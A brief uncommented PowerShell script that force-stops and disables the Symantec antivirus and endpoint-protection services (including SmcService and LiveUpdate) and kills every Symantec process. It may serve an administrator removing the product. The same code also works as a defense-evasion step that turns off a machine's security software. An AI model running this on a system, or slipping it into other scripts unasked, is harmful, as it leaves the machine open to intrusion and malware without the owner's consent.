$av_services = @("ccEvtMgr", "ccSetMgr", "ccSetMgr", "Symantec AntiVirus", "LiveUpdate", "SNAC")

foreach($service in $av_services) {
	Stop-Service $service -Force
	Set-Service $service -StartupType "Disabled"
} 

Get-Process | where { $_.ProcessName -eq "Smc" } | Select -Property Id | Stop-Process
Set-Service "SmcService" -StartupType "Disabled"

Get-Process | where { $_.Path -match "Symantec" } | Stop-Process